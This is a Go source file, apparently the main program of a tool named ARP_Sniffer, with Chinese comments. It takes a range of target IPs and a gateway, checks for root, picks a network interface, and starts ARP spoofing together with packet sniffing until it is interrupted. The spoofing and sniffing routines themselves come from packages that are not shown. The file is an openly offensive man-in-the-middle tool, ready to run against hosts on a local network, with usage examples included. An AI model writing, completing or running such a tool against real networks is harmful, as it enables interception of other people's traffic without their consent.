package main

import (
	"ARP_Sniffer/sniffer"
	"ARP_Sniffer/spoof"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"runtime"
	"syscall"
)

func checkPrivileges() error {
	if runtime.GOOS == "windows" {
		// Windows下暂时不检查权限
		return nil
	}
	if os.Geteuid() != 0 {
		return fmt.Errorf("需要root权限运行此程序\n在Linux系统下请使用 sudo 运行")
	}
	return nil
}

func getDefaultInterface() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return ""
	}

	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}
			for _, addr := range addrs {
				if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
					if ipnet.IP.To4() != nil {
						return iface.Name
					}
				}
			}
		}
	}
	return ""
}

func listInterfaces() {
	interfaces, err := net.Interfaces()
	if err != nil {
		log.Printf("获取网卡列表失败: %v", err)
		return
	}

	fmt.Println("\n可用网卡接口:")
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}
			for _, addr := range addrs {
				if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
					if ipnet.IP.To4() != nil {
						fmt.Printf("- %s: %s (%s)\n", iface.Name, ipnet.IP, iface.HardwareAddr)
					}
				}
			}
		}
	}
	fmt.Println()
}

func main() {
	var (
		targetRange   string
		gatewayIP     string
		interfaceName string
		showList      bool
	)

	// 检查权限
	if err := checkPrivileges(); err != nil {
		log.Fatal(err)
	}

	flag.StringVar(&targetRange, "target", "", "目标IP范围 (例如: 192.168.1.1-192.168.1.10 或 192.168.1.0/24)")
	flag.StringVar(&gatewayIP, "gateway", "", "网关IP")
	flag.StringVar(&interfaceName, "i", getDefaultInterface(), "网卡接口名称")
	flag.BoolVar(&showList, "l", false, "显示可用网卡列表")
	flag.Parse()

	if showList {
		listInterfaces()
		return
	}

	if targetRange == "" || gatewayIP == "" {
		fmt.Println("使用说明:")
		if runtime.GOOS == "windows" {
			fmt.Println("  arp_sniffer.exe -target 192.168.1.100-192.168.1.110 -gateway 192.168.1.1")
			fmt.Println("  arp_sniffer.exe -i WLAN -target 192.168.1.100 -gateway 192.168.1.1")
		} else {
			fmt.Println("  sudo ./arp_sniffer -target 192.168.1.100-192.168.1.110 -gateway 192.168.1.1")
			fmt.Println("  sudo ./arp_sniffer -i eth0 -target 192.168.1.100 -gateway 192.168.1.1")
		}
		fmt.Println("\n参数说明:")
		flag.PrintDefaults()
		os.Exit(1)
	}

	// 如果没有指定网卡，使用默认网卡
	if interfaceName == "" {
		log.Fatal("未能找到可用的网卡接口，请使用 -l 参数查看可用网卡列表")
	}

	// 创建ARP欺骗器
	arpSpoofer, err := spoof.NewARPSpoofer(interfaceName, targetRange, gatewayIP)
	if err != nil {
		log.Fatal(err)
	}

	// 创建数据包嗅探器
	packetSniffer, err := sniffer.NewPacketSniffer(interfaceName)
	if err != nil {
		log.Fatal(err)
	}

	// 设置信号处理
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// 启动ARP欺骗
	if err := arpSpoofer.Start(); err != nil {
		log.Fatal(err)
	}

	// 启动数据包嗅探
	packetSniffer.Start()

	fmt.Printf("\n正在使用网卡 %s 进行ARP欺骗...\n按 Ctrl+C 停止\n", interfaceName)

	// 等待中断信号
	<-sigChan
	fmt.Println("\n正在清理并退出...")

	// 停止所有组件
	packetSniffer.Stop()
	arpSpoofer.Stop()
}
